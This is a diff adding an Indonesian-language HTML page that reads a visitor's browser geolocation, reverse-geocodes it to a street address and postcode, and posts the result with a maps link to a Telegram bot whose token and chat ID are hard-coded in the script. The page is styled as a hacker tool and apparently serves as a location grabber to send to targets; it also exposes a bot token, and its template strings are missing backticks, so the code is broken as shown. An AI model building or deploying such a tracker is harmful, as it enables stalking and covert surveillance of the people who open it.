@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Pelacak Lokasi Kirim ke Telegram</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 30px;
+      text-align: center;
+    }
+    button {
+      padding: 10px 20px;
+      background: #0f0;
+      color: #000;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    pre {
+      background: #111;
+      padding: 15px;
+      margin-top: 20px;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h2>📍 Lacak Lokasi + Kirim Telegram</h2>
+  <button onclick="getLocation()">Lacak & Kirim</button>
+  <pre id="output">Klik tombol untuk mulai...</pre>
+
+  <script>
+    const token = "8144503530:AAE6pFvuAK_On07V5kSuFvLMPR5baMTU-SI";
+    const chatId = "7728427008";
+
+    async function getLocation() {
+      const output = document.getElementById("output");
+
+      if (!navigator.geolocation) {
+        output.textContent = "❌ Browser tidak support lokasi.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        output.textContent = Koordinat didapat:\nLatitude: ${lat}\nLongitude: ${lon}\n🔄 Sedang mencari alamat...;
+
+        const res = await fetch(https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json);
+        const data = await res.json();
+
+        const alamat = data.display_name || "Alamat tidak ditemukan";
+        const kodePos = data.address.postcode || "Tidak tersedia";
+
+        const msg = 
+📍 Lokasi Baru Terdeteksi!
+🌐 Latitude: ${lat}
+🌐 Longitude: ${lon}
+🏠 Alamat: ${alamat}
+📮 Kode Pos: ${kodePos}
+🗺️ Maps: https://maps.google.com/?q=${lat},${lon}
+        ;
+
+        output.textContent = msg;
+
+        // Kirim ke Telegram
+        await fetch(https://api.telegram.org/bot${token}/sendMessage, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+
+        output.textContent += "\n\n✅ Lokasi berhasil dikirim ke Telegram!";
+      }, err => {
+        output.textContent = "❌ Gagal ambil lokasi. Mungkin izin ditolak.";
+      });
+    }
+  </script>
+</body>
+</html>
